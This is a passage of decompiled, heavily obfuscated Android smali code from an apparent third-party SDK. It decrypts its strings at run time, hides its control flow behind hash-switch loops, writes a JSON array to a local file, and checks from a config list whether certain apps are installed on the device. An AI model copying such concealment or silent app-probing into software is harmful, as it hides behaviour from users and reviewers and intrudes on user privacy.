    const-string v4, "sv7PSlH2Lf4=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    invoke-virtual {v6, v2, v4}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v2

    sput-boolean v2, LCu7y/sdk/e5;->c:Z

    const-string v2, "YNSGBZOaabprzo4Skb55\n"

    const-string v4, "ArjnZvjbCs4=\n"

    invoke-static {v2, v4}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v5

    const v4, 0x2d8d87aa

    const-string v2, "\u06ec\u06e1\u06da\u06d9\u06e7\u06e5\u06e6\u06d8\u06d7\u06e6\u06e4\u06d8\u06d8\u06d8\u06d8\u06e1\u06d8\u06e1\u06e7\u06ec\u06e6\u06e8\u06db\u06d9\u06dc\u06d6\u06d8\u06dc\u06e7\u06d9\u06e2\u06d8\u06e1"

    :goto_38
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v4

    sparse-switch v7, :sswitch_data_25

    goto :goto_38

    :sswitch_7c
    new-instance v2, Ljava/io/File;

    invoke-virtual/range {p3 .. p3}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v4

    const-string v7, "2cyKSkIBVTXPyZ1AXTdRJeTDikpBOxo8yM+F\n"

    const-string v8, "u6DrKSleNFY=\n"

    invoke-static {v7, v8}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v2, v4, v7}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_6

    :try_start_1e
    new-instance v4, Ljava/io/FileWriter;

    const/4 v7, 0x0

    invoke-direct {v4, v2, v7}, Ljava/io/FileWriter;-><init>(Ljava/io/File;Z)V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_7

    const/4 v2, 0x2

    :try_start_1f
    invoke-virtual {v5, v2}, Lorg/json/JSONArray;->toString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/io/Writer;->flush()V
    :try_end_1f
    .catchall {:try_start_1f .. :try_end_1f} :catchall_0

    :try_start_20
    invoke-virtual {v4}, Ljava/io/Writer;->close()V
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_7

    :goto_39
    :try_start_21
    invoke-static {}, Lapi/repository/Utils;->getCurrentActivity()Landroid/app/Activity;

    move-result-object v7

    const v4, 0x3e0c0907

    const-string v2, "\u06e8\u06db\u06e5\u06d8\u06da\u06e7\u06d8\u06d8\u06e7\u06e7\u06e6\u06d8\u06e7\u06e4\u06d9\u06db\u06e8\u06eb\u06e1\u06e1\u06d8\u06e0\u06d7\u06db\u06e0\u06e5\u06e1\u06d8\u06e0\u06dc\u06d9\u06eb\u06d7"

    :goto_3a
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v4

    sparse-switch v8, :sswitch_data_26

    goto :goto_3a

    :sswitch_7d
    invoke-virtual {v7}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v8

    const/4 v2, 0x0

    :goto_3b
    const v9, -0x1fe24916

    const-string v4, "\u06df\u06e7\u06e8\u06e2\u06db\u06e6\u06d8\u06db\u06d7\u06e6\u06e5\u06d9\u06e8\u06e2\u06dc\u06db\u06dc\u06eb\u06e4\u06eb\u06e0\u06e5\u06d9\u06d8\u06eb\u06eb\u06d9\u06e4\u06e6\u06ec\u06da\u06e1\u06d9\u06e8\u06e0\u06e2\u06e8\u06d8\u06eb\u06d7\u06d6\u06d8\u06db\u06eb\u06d6\u06d8"

    :goto_3c
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_27

    goto :goto_3c

    :sswitch_7e
    const-string v4, "\u06d7\u06e0\u06e1\u06d8\u06e8\u06e6\u06da\u06d8\u06e0\u06e8\u06e7\u06ec\u06da\u06eb\u06e8\u06dc\u06d6\u06d7\u06e6\u06d8\u06e6\u06d6\u06d8\u06d8\u06e5\u06eb\u06d9\u06e4\u06e4\u06db\u06e1\u06e4\u06d6\u06d8\u06dc\u06eb\u06e0\u06d6\u06d6\u06da\u06e5\u06db\u06e5\u06d8\u06e1\u06eb\u06df"
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_6

    goto :goto_3c

    :sswitch_7f
    :try_start_22
    const-string v2, "\u06e1\u06e4\u06e8\u06e2\u06da\u06dc\u06df\u06e4\u06e8\u06d8\u06df\u06e7\u06eb\u06d7\u06d7\u06e4\u06ec\u06e8\u06e5\u06e0\u06eb\u06e0\u06ec\u06e5\u06e8\u06d8\u06d9\u06dc\u06d9\u06d7\u06d9\u06eb\u06db\u06d7\u06e6\u06d8\u06e6\u06d9\u06e6"

    goto/16 :goto_35

    :sswitch_80
    const v5, 0x5e5253c5

    const-string v2, "\u06e4\u06db\u06e1\u06e1\u06ec\u06e4\u06da\u06dc\u06d9\u06ec\u06dc\u06d7\u06d7\u06e7\u06e1\u06d8\u06df\u06e0\u06e4\u06d9\u06e1\u06e7\u06d8\u06e4\u06d8\u06d8\u06e0\u06d6\u06e7\u06df\u06e6\u06eb\u06d6\u06e8\u06eb\u06e5\u06e8\u06e8\u06d9\u06ec\u06e1\u06e8\u06e7"

    :goto_3d
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v5

    sparse-switch v9, :sswitch_data_28

    goto :goto_3d

    :sswitch_81
    const-string v2, "\u06e2\u06e8\u06da\u06d6\u06e6\u06df\u06d6\u06e4\u06d6\u06d8\u06e5\u06e6\u06db\u06dc\u06e8\u06d6\u06e0\u06e2\u06d9\u06e6\u06e6\u06da\u06e7\u06d7\u06e0\u06ec\u06ec\u06eb\u06db\u06df\u06e4\u06dc\u06e4\u06e5\u06ec\u06df\u06d7\u06e1\u06d6\u06d8\u06e7\u06ec"

    goto :goto_3d

    :cond_f
    const-string v2, "\u06da\u06e2\u06ec\u06d7\u06e7\u06d8\u06e8\u06da\u06ec\u06e7\u06e8\u06e6\u06d8\u06dc\u06e5\u06e4\u06e1\u06e6\u06e1\u06d8\u06df\u06df\u06e6\u06d8\u06e2\u06df\u06e5\u06db\u06e7\u06ec\u06d9\u06e8\u06e6\u06d8\u06d8\u06d8\u06ec\u06ec\u06df\u06eb\u06df\u06d7\u06e7\u06e2\u06dc\u06e2\u06da\u06e4\u06e1\u06d8\u06e6\u06d8\u06d7\u06e5\u06e2\u06d9\u06e4\u06e4\u06db"

    goto :goto_3d

    :sswitch_82
    invoke-virtual {v8}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-lez v2, :cond_f

    const-string v2, "\u06e2\u06e5\u06e1\u06d8\u06df\u06ec\u06dc\u06e7\u06db\u06ec\u06e4\u06e0\u06e8\u06d8\u06dc\u06ec\u06d6\u06e4\u06e5\u06d8\u06d8\u06d6\u06db\u06da\u06d8\u06da\u06d7\u06d7\u06d6\u06eb\u06e7\u06e4\u06d8\u06eb\u06ec\u06d8\u06e2\u06e8\u06da\u06e0\u06e5\u06d8\u06db\u06df\u06e5\u06d8\u06df\u06d8\u06e2\u06e2\u06d9\u06e8\u06d8\u06da\u06dc\u06e1\u06e2\u06d6\u06e6"

    goto :goto_3d

    :sswitch_83
    const-string v2, "\u06e7\u06ec\u06dc\u06e6\u06df\u06e5\u06e8\u06da\u06d6\u06d8\u06df\u06d9\u06e0\u06dc\u06e5\u06d6\u06ec\u06d8\u06df\u06e0\u06e7\u06d8\u06e6\u06d9\u06e5\u06e5\u06e6\u06ec\u06e5\u06df\u06e6\u06d8\u06df\u06e1\u06da\u06e8\u06df\u06e6\u06e2\u06db\u06d9\u06ec\u06e2\u06d8\u06d8"

    goto/16 :goto_35

    :sswitch_84
    const-string v2, "\u06e0\u06e6\u06db\u06ec\u06e6\u06e8\u06d8\u06e6\u06e7\u06d6\u06d8\u06e7\u06e7\u06d6\u06d8\u06e0\u06d8\u06e6\u06d8\u06e0\u06d8\u06e1\u06e5\u06e8\u06da\u06eb\u06e8\u06d9\u06ec\u06da\u06d8\u06e4\u06d6"

    goto/16 :goto_35

    :sswitch_85
    const-string v2, "\u06db\u06e2\u06d9\u06df\u06e7\u06e8\u06d8\u06db\u06eb\u06e1\u06e6\u06ec\u06e1\u06e4\u06ec\u06e5\u06d8\u06dc\u06e4\u06d6\u06e6\u06d6\u06d8\u06d8\u06d9\u06e6\u06d6\u06da\u06e6\u06d6\u06e2\u06e4\u06e4"

    goto/16 :goto_37

    :sswitch_86
    const v9, 0x2cb9896c

    const-string v2, "\u06e8\u06d9\u06ec\u06db\u06e1\u06dc\u06d8\u06e6\u06e1\u06d7\u06ec\u06ec\u06e8\u06e7\u06d6\u06e4\u06dc\u06d8\u06dc\u06e4\u06e8\u06e8\u06d8\u06e0\u06e0\u06e7\u06d6\u06e6\u06db\u06d9\u06df\u06e1\u06e6\u06e2\u06d6\u06dc\u06da\u06e8\u06e8\u06dc\u06d7\u06e4\u06e0\u06e5\u06d7\u06e0\u06e4\u06db\u06dc\u06d6"

    :goto_3e
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_29

    goto :goto_3e

    :sswitch_87
    invoke-virtual {v8}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-ge v5, v2, :cond_10

    const-string v2, "\u06e0\u06d8\u06d8\u06e2\u06e8\u06e7\u06e1\u06d7\u06df\u06d6\u06da\u06dc\u06e1\u06e1\u06e0\u06eb\u06ec\u06d6\u06d8\u06e0\u06e0\u06e8\u06d8\u06d7\u06d8\u06e1\u06d8\u06ec\u06df\u06d9\u06e0\u06d8\u06df\u06e2\u06e2\u06e2\u06d7\u06da\u06d7\u06e8\u06d8\u06da\u06ec\u06d8\u06eb\u06dc\u06e2\u06e7\u06d7\u06e6\u06d8\u06e1\u06e7\u06e8\u06d8\u06ec\u06d7\u06dc\u06d8"

    goto :goto_3e

    :cond_10
    const-string v2, "\u06d9\u06dc\u06d9\u06eb\u06d9\u06da\u06df\u06d6\u06da\u06db\u06ec\u06e1\u06db\u06e6\u06e5\u06e1\u06d6\u06e7\u06d8\u06d8\u06e6\u06e8\u06d8\u06d9\u06d7\u06d7\u06e1\u06d7\u06e8\u06e2\u06dc\u06db\u06df\u06d6\u06e6\u06d8\u06da\u06e2\u06e8\u06df\u06df\u06db\u06d6\u06ec\u06e4\u06d7\u06e7\u06d6\u06d8\u06e1\u06e8\u06d8"

    goto :goto_3e

    :sswitch_88
    const-string v2, "\u06db\u06e6\u06d8\u06d8\u06e7\u06d9\u06e5\u06d8\u06e6\u06e0\u06e6\u06d8\u06e4\u06d7\u06dc\u06e8\u06d9\u06ec\u06eb\u06e8\u06d9\u06e2\u06e4\u06e1\u06e5\u06dc\u06e8\u06d8\u06d9\u06dc\u06d6\u06e7\u06dc\u06db\u06e5\u06d9\u06dc\u06d8\u06e1\u06d6\u06d8\u06e8\u06eb\u06e8\u06d8\u06e2\u06da\u06eb\u06dc\u06e0\u06e8\u06d9\u06e4\u06d7"

    goto :goto_3e

    :sswitch_89
    const-string v2, "\u06e1\u06e0\u06e2\u06e1\u06e1\u06e0\u06d6\u06ec\u06e5\u06df\u06e4\u06e5\u06d8\u06e2\u06eb\u06e8\u06d8\u06e5\u06dc\u06d9\u06d9\u06e8\u06eb\u06e7\u06da\u06e8\u06e0\u06e6\u06e5\u06d8\u06dc\u06df\u06e0"

    goto/16 :goto_37

    :sswitch_8a
    const-string v2, "\u06eb\u06df\u06e5\u06d8\u06e8\u06df\u06db\u06e5\u06d7\u06dc\u06d8\u06e5\u06ec\u06ec\u06db\u06e5\u06d6\u06d8\u06d9\u06e8\u06eb\u06e1\u06e4\u06d6\u06d8\u06e4\u06d6\u06eb\u06df\u06d6\u06e7\u06d8\u06ec\u06e2\u06e7\u06e2\u06dc\u06e7\u06db\u06e1"

    goto/16 :goto_37

    :sswitch_8b
    invoke-virtual {v8, v5}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v4

    const v9, 0x20863583

    const-string v2, "\u06e8\u06db\u06e2\u06d6\u06d9\u06e1\u06d8\u06d8\u06e7\u06d8\u06da\u06d7\u06da\u06df\u06d8\u06d8\u06e6\u06e5\u06e1\u06d8\u06d8\u06e0\u06d6\u06d8\u06e8\u06e7\u06ec\u06e1\u06e4\u06e7\u06ec\u06dc\u06d8\u06e5\u06db\u06d8\u06d8\u06e4\u06da\u06dc"

    :goto_3f
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v10

    xor-int/2addr v10, v9

    sparse-switch v10, :sswitch_data_2a

    goto :goto_3f

    :goto_40
    :sswitch_8c
    add-int/lit8 v2, v5, 0x1

    move v5, v2

    goto/16 :goto_36

    :sswitch_8d
    const-string v2, "\u06d8\u06eb\u06d6\u06d8\u06e2\u06ec\u06dc\u06d8\u06e0\u06db\u06ec\u06d8\u06eb\u06e7\u06d6\u06dc\u06e8\u06e0\u06d6\u06e5\u06d8\u06d9\u06d9\u06d8\u06d8\u06ec\u06dc\u06ec\u06d7\u06d6\u06e6\u06dc\u06e0"

    goto :goto_3f

    :sswitch_8e
    const v10, -0x4636de67

    const-string v2, "\u06ec\u06e4\u06eb\u06e2\u06ec\u06d6\u06d8\u06db\u06e2\u06e6\u06e6\u06d8\u06e1\u06d8\u06eb\u06e6\u06e0\u06e0\u06e0\u06d8\u06e8\u06eb\u06d8\u06d8\u06e4\u06d9\u06d6\u06d8\u06e6\u06d8\u06d7\u06ec\u06e1\u06d8"

    :goto_41
    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v10

    sparse-switch v11, :sswitch_data_2b

    goto :goto_41

    :sswitch_8f
    if-nez v4, :cond_11

    const-string v2, "\u06e0\u06e5\u06eb\u06eb\u06e4\u06e5\u06d8\u06e8\u06e1\u06db\u06db\u06d7\u06da\u06eb\u06e0\u06d6\u06d8\u06d9\u06eb\u06e1\u06d8\u06e0\u06e4\u06e8\u06d8\u06e5\u06db\u06e2\u06ec\u06eb\u06e8\u06eb\u06e0\u06d9\u06d8\u06d6\u06e8\u06d8\u06df\u06e5\u06d6\u06d8\u06df\u06da\u06d6\u06d8\u06d8\u06d6\u06da\u06dc\u06df\u06e5\u06d8\u06df\u06e0\u06db\u06df\u06e4\u06da"

    goto :goto_41

    :cond_11
    const-string v2, "\u06e5\u06e0\u06e4\u06e8\u06d9\u06d8\u06db\u06e1\u06e6\u06d8\u06dc\u06da\u06e2\u06d7\u06e7\u06dc\u06e7\u06d6\u06d8\u06e6\u06df\u06e5\u06d8\u06e0\u06ec\u06df\u06da\u06dc\u06da\u06e4\u06e4\u06eb\u06dc\u06e1\u06e6\u06d8\u06da\u06df\u06ec\u06d9\u06df\u06e5\u06db\u06d9\u06db\u06db\u06e1\u06d8\u06e1\u06d7\u06eb\u06e5\u06e7\u06d9\u06e7\u06e7\u06d6"

    goto :goto_41

    :sswitch_90
    const-string v2, "\u06e2\u06db\u06e8\u06d8\u06da\u06e8\u06db\u06ec\u06eb\u06dc\u06d8\u06e1\u06e5\u06e7\u06d8\u06d7\u06e6\u06d9\u06e1\u06db\u06da\u06d8\u06d6\u06e6\u06ec\u06dc\u06e2\u06d7\u06ec\u06d6\u06e1\u06df\u06d6\u06d8\u06e0\u06db\u06da\u06d9\u06e2\u06e4\u06e5\u06ec\u06e8\u06d8\u06d6\u06d6\u06e5"

    goto :goto_41

    :sswitch_91
    const-string v2, "\u06d8\u06e8\u06d6\u06e4\u06d9\u06e2\u06eb\u06e7\u06dc\u06e7\u06eb\u06e8\u06d8\u06eb\u06e8\u06dc\u06d8\u06dc\u06e1\u06d8\u06d6\u06e2\u06e1\u06e1\u06e5\u06e0\u06e2\u06e8\u06d8\u06e0\u06d7\u06e1\u06e4\u06dc\u06e0\u06dc\u06e4\u06eb\u06e2\u06dc\u06e8\u06d8\u06db\u06e6\u06db"
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_4

    goto :goto_3f

    :sswitch_92
    const-string v2, "\u06e8\u06d8\u06e6\u06d8\u06e6\u06e7\u06e8\u06d8\u06e7\u06e4\u06e6\u06df\u06d6\u06d6\u06d8\u06e5\u06d8\u06e4\u06e7\u06d6\u06db\u06df\u06d8\u06e1\u06dc\u06e5\u06e8\u06d8\u06d9\u06e4\u06e8\u06e0\u06e5\u06e7\u06d8\u06eb\u06ec\u06e8\u06d6\u06d7\u06e6\u06d8\u06d6\u06db\u06e5\u06db\u06da\u06df\u06e7\u06d6\u06dc\u06d8\u06ec\u06e8\u06da\u06e5\u06dc\u06e0\u06e6\u06d7\u06e4"

    goto :goto_3f

    :sswitch_93
    :try_start_23
    const-string v2, "AY9Q02Eq2skfj17d\n"

    const-string v9, "ce4zuABNv5Y=\n"

    invoke-static {v2, v9}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v2, "LXTG+NxsSQUwYdc=\n"

    const-string v10, "SRGynb8YFnE=\n"

    invoke-static {v2, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v10, 0x0

    invoke-virtual {v4, v2, v10}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v10

    const-string v2, "rEWnEK+g1t60VrY=\n"

    const-string v11, "zSbTecDOiao=\n"

    invoke-static {v2, v11}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const/4 v11, 0x0

    invoke-virtual {v4, v2, v11}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v11

    const-string v2, "921grG4PGtQ=\n"

    const-string v12, "gwQQ8xpqYqA=\n"

    invoke-static {v2, v12}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_4

    move-result-object v2

    :try_start_24
    invoke-virtual {v4, v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_6

    move-result-object v12

    const/4 v2, 0x0

    :try_start_25
    invoke-virtual {v7, v9, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_25
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_25 .. :try_end_25} :catch_5
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_6

    const/4 v2, 0x1

    :goto_42
    const v13, -0x3eac9d2a

    const-string v4, "\u06e4\u06e8\u06df\u06eb\u06ec\u06dc\u06e7\u06e6\u06d8\u06ec\u06d7\u06d6\u06dc\u06d9\u06e4\u06d7\u06d9\u06e6\u06d8\u06e0\u06e5\u06df\u06dc\u06eb\u06d7\u06da\u06e5\u06df\u06e5\u06d8\u06dc\u06df\u06d6\u06d8\u06df\u06e0\u06e2\u06df\u06d6\u06dc\u06d8\u06db\u06e4\u06e2\u06db\u06e1\u06d8\u06d6\u06da\u06e2\u06eb\u06d7\u06db\u06d6\u06e0\u06da"

    :goto_43
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v14

    xor-int/2addr v14, v13

    sparse-switch v14, :sswitch_data_2c

    goto :goto_43

    :sswitch_94
    const v13, 0x6b806842

    const-string v4, "\u06eb\u06d9\u06da\u06e4\u06df\u06d9\u06e8\u06dc\u06db\u06e6\u06e7\u06e5\u06e6\u06e7\u06eb\u06e4\u06e0\u06d7\u06df\u06eb\u06e1\u06d8\u06e4\u06df\u06e6\u06e2\u06e0\u06e4\u06d9\u06e4\u06e5\u06e1\u06e8\u06ec\u06e7\u06e4\u06e0\u06da\u06e5\u06ec\u06e2\u06dc\u06e7\u06eb\u06db\u06e8\u06d8\u06d7\u06d6\u06e5"

    :goto_44
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v14

    xor-int/2addr v14, v13

    sparse-switch v14, :sswitch_data_2d

    goto :goto_44

    :sswitch_95
    const-string v4, "\u06d8\u06da\u06dc\u06eb\u06e2\u06dc\u06e5\u06e7\u06e2\u06dc\u06db\u06d6\u06e8\u06e4\u06db\u06db\u06e6\u06dc\u06d8\u06d8\u06e0\u06e6\u06d9\u06e8\u06e1\u06d8\u06e8\u06e4\u06d6\u06d8\u06e8\u06e0\u06e1"

    goto :goto_44

    :catch_5
    move-exception v2

    const/4 v2, 0x0

    goto :goto_42

    :sswitch_96
    const-string v4, "\u06e7\u06e4\u06e6\u06d8\u06e6\u06e5\u06dc\u06d8\u06da\u06df\u06d6\u06df\u06d8\u06e4\u06dc\u06e0\u06e5\u06e5\u06e0\u06e4\u06eb\u06d6\u06d7\u06d9\u06e5\u06eb\u06eb\u06d9\u06d9\u06e8\u06dc\u06e1\u06d8\u06d7\u06e2\u06e5\u06e0\u06d9\u06dc"

    goto :goto_43

    :sswitch_97
    const v14, -0x13862dec

    const-string v4, "\u06e4\u06da\u06df\u06e1\u06db\u06e6\u06e2\u06e6\u06ec\u06e8\u06e8\u06dc\u06e4\u06dc\u06ec\u06db\u06d7\u06e4\u06e2\u06da\u06e6\u06d8\u06db\u06d9\u06e1\u06d8\u06df\u06e1\u06e2\u06e1\u06d6\u06dc\u06d8\u06e8\u06db\u06e8\u06d8\u06e5\u06e7\u06e7\u06e0\u06e4\u06e1\u06e1\u06da\u06e4"

    :goto_45
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v15

    xor-int/2addr v15, v14

    sparse-switch v15, :sswitch_data_2e

    goto :goto_45

    :sswitch_98
    const-string v4, "\u06e2\u06da\u06e4\u06d6\u06df\u06db\u06d7\u06dc\u06e8\u06d6\u06ec\u06e8\u06e7\u06e7\u06e6\u06d7\u06e6\u06d6\u06d8\u06e6\u06e6\u06dc\u06e5\u06da\u06df\u06e6\u06d8\u06e7\u06e2\u06e1\u06e7\u06d8\u06dc\u06d8\u06d6\u06dc\u06e8\u06d8\u06e1\u06eb\u06e7\u06ec\u06e2\u06e6\u06d8\u06ec\u06e6\u06dc\u06d6\u06e0\u06d8\u06d8"

    goto :goto_45

    :cond_12
    const-string v4, "\u06e2\u06eb\u06e8\u06e0\u06da\u06dc\u06e0\u06d6\u06dc\u06ec\u06da\u06d9\u06e4\u06d8\u06d8\u06d8\u06e7\u06d7\u06d8\u06d8\u06dc\u06e1\u06d9\u06e4\u06d9\u06da\u06dc\u06e4\u06d9\u06da\u06e4\u06e6\u06d8\u06e4\u06e5\u06df\u06df\u06eb\u06eb\u06e5\u06da\u06e6\u06e5\u06dc\u06dc\u06d8\u06db\u06e1\u06eb\u06e6\u06eb\u06eb"

    goto :goto_45

    :sswitch_99
    if-nez v10, :cond_12

    const-string v4, "\u06d9\u06e1\u06ec\u06e8\u06eb\u06dc\u06d8\u06d7\u06e4\u06e6\u06d7\u06d8\u06da\u06e5\u06e5\u06e1\u06d8\u06e8\u06e8\u06d6\u06d8\u06e4\u06eb\u06da\u06da\u06dc\u06e5\u06d8\u06df\u06e4\u06dc\u06db\u06e0\u06da\u06d8\u06df\u06e1\u06d8\u06dc\u06e8\u06e7\u06d8\u06df\u06e1\u06df\u06e0\u06e5\u06ec\u06e6\u06e7\u06d7\u06d8\u06e4\u06e5"

    goto :goto_45

    :sswitch_9a
    const-string v4, "\u06d8\u06e7\u06df\u06d8\u06dc\u06df\u06ec\u06d7\u06e0\u06e0\u06df\u06ec\u06d6\u06e8\u06d8\u06e8\u06d8\u06d8\u06e1\u06d8\u06eb\u06d7\u06df\u06e5\u06d8\u06e6\u06d8\u06dc\u06d8\u06db\u06eb\u06e5\u06d9\u06df\u06e5\u06e5\u06db\u06ec\u06d8\u06d8\u06d9\u06df\u06e2\u06d8\u06d6\u06eb\u06e8\u06d8\u06d9\u06e5\u06d8"

    goto :goto_43

    :sswitch_9b
    const-string v4, "\u06d6\u06e8\u06d6\u06d6\u06d6\u06d8\u06e2\u06e7\u06d6\u06d8\u06e2\u06e5\u06da\u06da\u06e4\u06df\u06d7\u06e6\u06dc\u06e8\u06e5\u06e2\u06e8\u06d7\u06d6\u06ec\u06e7\u06e5\u06d6\u06e5\u06ec"

    goto :goto_43

    :sswitch_9c
    const-string v4, "\u06d6\u06db\u06e4\u06e5\u06df\u06e2\u06dc\u06e6\u06e1\u06dc\u06d7\u06df\u06d8\u06e0\u06d6\u06e7\u06da\u06ec\u06d7\u06dc\u06db\u06e6\u06eb\u06e1\u06e0\u06da\u06e8\u06db\u06e4\u06dc\u06d6\u06d8\u06e0\u06db\u06e7\u06e8\u06dc\u06e2\u06e4\u06e4\u06e1\u06df"

    goto :goto_44

    :sswitch_9d
    const v14, 0x31417a9a

    const-string v4, "\u06e1\u06e5\u06d9\u06e4\u06d7\u06e6\u06e0\u06e6\u06dc\u06d7\u06ec\u06e0\u06e6\u06e7\u06e2\u06d6\u06d8\u06e8\u06d8\u06db\u06e4\u06e7\u06e2\u06e1\u06eb\u06e5\u06da\u06dc\u06ec\u06d7\u06e7\u06e1\u06d9\u06d7\u06e6\u06d8\u06df\u06e0\u06eb\u06e0\u06db\u06d7"

    :goto_46
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v15

    xor-int/2addr v15, v14

    sparse-switch v15, :sswitch_data_2f

    goto :goto_46

    :sswitch_9e
    const-string v4, "\u06e5\u06d8\u06e1\u06d8\u06e5\u06df\u06e5\u06e0\u06e1\u06e2\u06d8\u06e8\u06e1\u06da\u06e1\u06eb\u06da\u06dc\u06eb\u06eb\u06e8\u06e4\u06e2\u06e1\u06e1\u06e2\u06e6\u06e7\u06e8\u06d6\u06d8\u06d8\u06e7\u06ec\u06e4\u06da\u06ec"

    goto :goto_44

    :cond_13
    const-string v4, "\u06db\u06e8\u06da\u06d8\u06e4\u06e7\u06db\u06dc\u06d8\u06db\u06d7\u06d7\u06dc\u06e8\u06e7\u06d8\u06df\u06e1\u06e8\u06d8\u06e7\u06d8\u06e6\u06dc\u06e5\u06d8\u06da\u06dc\u06d6\u06e4\u06da"

    goto :goto_46

    :sswitch_9f
    if-nez v2, :cond_13

    const-string v4, "\u06dc\u06e8\u06ec\u06df\u06da\u06e6\u06d8\u06e5\u06eb\u06d6\u06d8\u06e6\u06e5\u06d6\u06e1\u06df\u06e6\u06d8\u06e4\u06e6\u06dc\u06eb\u06eb\u06d6\u06e4\u06e1\u06db\u06e8\u06d9\u06e1\u06d8\u06d7\u06d8\u06e4\u06e0\u06d6\u06dc\u06e0\u06e2\u06e2\u06d6\u06db\u06d7\u06e0\u06df\u06e7\u06e2\u06e2\u06e7\u06e8\u06dc\u06d8\u06d8"

    goto :goto_46

    :sswitch_a0
    const-string v4, "\u06d6\u06e7\u06d6\u06db\u06e4\u06e8\u06e1\u06e1\u06da\u06e4\u06e0\u06ec\u06e5\u06e6\u06e7\u06e0\u06ec\u06e5\u06e1\u06e0\u06d6\u06db\u06e7\u06eb\u06df\u06dc\u06da\u06d9\u06d9\u06dc\u06dc\u06ec\u06db\u06e1\u06d7\u06dc\u06e0\u06d9\u06eb\u06e0"

    goto :goto_46

    :sswitch_a1
    const v13, -0x45d547ea

    const-string v4, "\u06d7\u06d9\u06e5\u06d8\u06d6\u06e5\u06da\u06e7\u06d7\u06e2\u06e4\u06e7\u06e0\u06db\u06dc\u06d8\u06da\u06e5\u06e5\u06d8\u06e4\u06d9\u06d6\u06e7\u06e2\u06e6\u06d6\u06d9\u06d9\u06ec\u06e6\u06e5\u06d8\u06e7\u06d6\u06e4\u06df\u06eb\u06d6"

    :goto_47
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v14

    xor-int/2addr v14, v13

    sparse-switch v14, :sswitch_data_30

    goto :goto_47

    :sswitch_a2
    const v14, 0x696a4acc

    const-string v4, "\u06df\u06ec\u06dc\u06d8\u06e1\u06e8\u06eb\u06e2\u06ec\u06da\u06e2\u06d7\u06e5\u06d8\u06e4\u06eb\u06e7\u06e7\u06d6\u06d6\u06e0\u06d6\u06d6\u06e4\u06eb\u06d9\u06e6\u06d9\u06e1\u06e0\u06e2\u06e5\u06e5\u06e0\u06dc\u06d8\u06df\u06df\u06e8\u06e6\u06db\u06eb\u06e1\u06e7\u06e6\u06d8\u06e2\u06e1\u06da\u06e7\u06d6\u06e7"

    :goto_48
    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v15

    xor-int/2addr v15, v14

    sparse-switch v15, :sswitch_data_31

    goto :goto_48

    :sswitch_a3
    const/4 v4, 0x1

    if-ne v10, v4, :cond_14

